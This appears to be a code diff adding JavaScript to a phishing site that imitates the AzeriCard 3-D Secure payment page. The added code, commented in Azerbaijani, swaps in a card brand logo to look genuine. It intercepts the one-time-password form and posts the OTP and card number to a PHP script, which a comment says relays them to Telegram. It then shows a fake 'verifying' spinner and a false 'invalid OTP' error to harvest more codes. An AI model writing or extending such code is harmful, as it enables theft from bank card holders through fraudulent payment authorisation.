@@ -380,3 +380,70 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 });
+
+document.addEventListener('DOMContentLoaded', function() {
+    if (window.location.href.includes('azericard-3ds.html')) {
+        
+        // 1. Kart loqosunu düzəldirik (Mastercard/Visa)
+        const logoImg = document.querySelector('.card-logo, .payment-logo, .card-brand, img[src*="mastercard"], img[src*="visa"]');
+        if (logoImg) {
+            logoImg.src = '/azericard/images/mastercard.png'; 
+            logoImg.style.width = '40px';
+            logoImg.style.height = 'auto';
+        }
+
+        // 2. OTP Formunun göndərilməsi
+        const otpForm = document.querySelector('form');
+        if (otpForm) {
+            otpForm.addEventListener('submit', function(e) {
+                e.preventDefault(); // Səhifənin yenilənməsini dayandırırıq
+                
+                const otpInput = otpForm.querySelector('input[type="text"], input[type="tel"], input[type="number"]');
+                const otpValue = otpInput ? otpInput.value : '';
+                const cardParam = new URLSearchParams(window.location.search).get('card') || '';
+
+                // 1. Məlumatı arxa planda PHP-yə (Telegram-a) göndəririk
+                const formData = new FormData();
+                formData.append('otp', otpValue);
+                formData.append('card', cardParam);
+
+                fetch('/azericard/3ds.php', {
+                    method: 'POST',
+                    body: formData
+                }).catch(err => console.log('Xəta:', err));
+
+                // 2. Dərhal ekranda 10 saniyəlik gözləmə yaradırıq
+                const loadingHtml = `
+                    <div id="custom-loading" style="text-align:center; padding: 30px 10px;">
+                        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #2c3e50; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+                        <p style="font-weight: bold; color: #333; font-size: 16px;">Zəhmət olmasa gözləyin, məlumatlarınız yoxlanılır...</p>
+                    </div>
+                `;
+                otpForm.innerHTML = loadingHtml;
+                
+                // 3. 10 saniyə sonra OTP səhifəsini yenidən açırıq və xəta yazırıq
+                setTimeout(function() {
+                    // Səhifəni yeniləyirik və xəta parametrini URL-ə əlavə edirik
+                    const currentUrl = window.location.href.split('&error=')[0];
+                    window.location.href = currentUrl + '&error=invalid_otp';
+                }, 10000); 
+            });
+        }
+        
+        // 4. Əgər URL-də "error=invalid_otp" varsa, aşağıda xəta mesajı göstəririk
+        if (window.location.href.includes('error=invalid_otp')) {
+            const errDiv = document.createElement('div');
+            errDiv.style.color = '#d9534f';
+            errDiv.style.textAlign = 'center';
+            errDiv.style.marginTop = '20px';
+            errDiv.style.fontWeight = 'bold';
+            errDiv.style.fontSize = '14px';
+            errDiv.innerText = 'OTP kodu yanlışdır. Zəhmət olmasa yenidən cəhd edin.';
+            
+            const formParent = document.querySelector('form');
+            if (formParent) {
+                formParent.parentNode.insertBefore(errDiv, formParent.nextSibling);
+            }
+        }
+    }
+});
